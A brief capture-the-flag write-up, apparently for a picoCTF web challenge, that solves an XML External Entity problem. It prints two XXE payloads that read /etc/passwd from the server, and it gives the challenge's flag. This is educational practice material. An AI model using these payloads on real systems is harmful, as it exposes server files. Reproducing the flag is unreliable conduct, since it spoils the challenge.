## A very fun XXE problem

We are first met with a simple website that has 3 icons and 3 buttons. Clicking on each provides as with a description.

[img here]

Inspecting the web requests with Burp we see it pulls its data using XML which opens the way to XXE;

Adapting the payload I found on payloadallthethings [github link]

<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

and changing to the tags the xml file expects

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<data>
 <ID>&ent;</ID>
</data>

we get the flag in /etc/passwd like the challenge asked us

[spoiler] picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
